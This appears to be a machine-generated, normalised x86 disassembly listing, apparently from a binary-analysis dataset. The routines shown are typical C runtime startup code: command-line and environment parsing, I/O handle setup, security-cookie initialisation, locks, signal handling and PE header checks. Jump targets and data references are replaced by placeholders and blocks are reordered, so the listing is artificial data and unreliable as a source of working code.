cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_406562
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_40838d
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_4085d5
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_4065c1
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_40838d
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_406ef7
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_405580
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_405580
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_404f01
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_406ef7
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_404f01
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_405518
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_406266
int3
add edi 0x4
sub_40669d
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_4085d5
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4085d5
pop ecx
test eax eax
je r-xdata
call sub_4085d5
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_406837
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40838d
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40669d
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_406eb2
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40669d
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4068f2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_406eb2
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_404f01
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_406989
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_406ef7
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_406ef7
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_406bce
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_406bf4
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_406c20
push sub_406c80
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_406c80
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4049bd
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4049bd
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40856b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_408522
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4049bd
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4049bd
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_408552
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40856b
mov eax [ ebp + 0xc ]
push r--data
call sub_4074e0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_4049bd
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_408539
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_4049bd
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_406e0f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_406eb2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_404f7b
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_406ef7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40573c
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_406f43
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4085ed
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_406f91
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405051
mov [ eax ] 0x16
call sub_4062b8
or eax 0xffffffff
pop ebp
retn
sub_406fc4
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40700e
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_404f01
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40707c
push 0xc
push r--data
call sub_406c20
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_405c7e
push 0x1e
call sub_405acf
push 0xff
call sub_4057e9
push 0x18
call sub_406eb2
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40713e
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405051
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_406c65
retn
push edi
call sub_404f01
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_404f01
pop ecx
call sub_405051
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_407135
mov eax [ ebp - 0x1c ]
sub_40713e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40707c
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_405a8b
sub_407224
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_407268
push 0x20
push r--data
call sub_406c20
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_405dee
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_406c65
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_407224
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_405a57
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405051
mov [ eax ] 0x16
call sub_4062b8
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40713e
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_405cb7
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4073cf
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_407429
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_407450
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_407490
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4074e0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_406c80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_407450
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_407490
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40759c
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_405cb7
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
